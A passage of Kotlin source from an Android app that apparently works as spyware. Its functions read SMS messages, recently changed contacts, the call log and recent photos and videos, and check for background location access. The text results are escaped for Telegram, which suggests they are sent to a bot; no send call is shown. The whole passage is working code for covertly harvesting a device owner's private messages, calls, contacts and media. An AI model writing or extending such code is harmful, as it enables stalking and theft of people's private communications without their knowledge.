fun temLocalizacaoBackground(ctx: Context): Boolean =
        Build.VERSION.SDK_INT < 29 ||
            ContextCompat.checkSelfPermission(
                ctx, Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ) == PackageManager.PERMISSION_GRANTED

    @SuppressLint("MissingPermission")
    fun sms(ctx: Context, desde: Long): String = buildString {
        append("<b>SMS</b>\n")
        try {
            ctx.contentResolver.query(
                android.net.Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                "date > ?", arrayOf(desde.toString()), "date DESC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < Config.ROW_LIMIT) {
                    val tipo = if (c.getInt(3) == 1) "RECEBIDO" else "ENVIADO"
                    append("[${data(c.getLong(2))}] $tipo ${Telegram.esc(c.getString(0) ?: "")}\n")
                    append(Telegram.esc(c.getString(1) ?: "")).append("\n\n")
                    n++
                }
            }
        } catch (e: Exception) {
            append("Sem acesso aos SMS\n")
        }
    }

    fun contatos(ctx: Context, desde: Long): String = buildString {
        append("<b>Contatos</b>\n")
        try {
            ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ),
                "${ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP} > ?",
                arrayOf(desde.toString()), null
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < Config.ROW_LIMIT) {
                    append(Telegram.esc(c.getString(0) ?: "")).append(": ")
                    append(Telegram.esc(c.getString(1) ?: "")).append("\n")
                    n++
                }
            }
        } catch (e: Exception) {
            append("Sem acesso aos contatos\n")
        }
    }

    @SuppressLint("MissingPermission")
    fun chamadas(ctx: Context, desde: Long): String = buildString {
        append("<b>Chamadas</b>\n")
        try {
            ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                "${CallLog.Calls.DATE} > ?", arrayOf(desde.toString()),
                "${CallLog.Calls.DATE} DESC"
            )?.use { c ->
                var n = 0
                while (c.moveToNext() && n < Config.ROW_LIMIT) {
                    val tipo = when (c.getInt(1)) {
                        CallLog.Calls.INCOMING_TYPE -> "ENTRADA"
                        CallLog.Calls.OUTGOING_TYPE -> "SAÍDA"
                        CallLog.Calls.MISSED_TYPE -> "PERDIDA"
                        else -> "?"
                    }
                    append("[${data(c.getLong(2))}] $tipo ")
                    append(Telegram.esc(c.getString(0) ?: "")).append(" (${c.getLong(3)}s)\n")
                    n++
                }
            }
        } catch (e: Exception) {
            append("Sem acesso ao histórico de chamadas\n")
        }
    }

    data class Midia(val arquivos: List<File>, val ate: Long)

    fun midiaRecente(ctx: Context, desde: Long): Midia {
        val saida = mutableListOf<File>()
        var maior = desde
        val projecao = arrayOf(
            MediaStore.MediaColumns.DATA,
            MediaStore.MediaColumns.DATE_ADDED
        )
        val colecoes = listOf(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI
        )
        for (uri in colecoes) {
            try {
                ctx.contentResolver.query(
                    uri, projecao,
                    "${MediaStore.MediaColumns.DATE_ADDED} > ?", arrayOf(desde.toString()),
                    "${MediaStore.MediaColumns.DATE_ADDED} DESC"
                )?.use { c ->
                    var n = 0
                    while (c.moveToNext() && n < Config.MEDIA_LIMIT) {
                        val caminho = c.getString(0) ?: continue
                        val carimbo = c.getLong(1)
                        if (carimbo > maior) maior = carimbo
                        val arquivo = File(caminho)
                        if (arquivo.exists() && arquivo.length() in 1..Config.MEDIA_MAX_BYTES) {
                            saida.add(arquivo)
                            n++
                        }
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "mídia")
            }
        }
        return Midia(saida, maior)
    }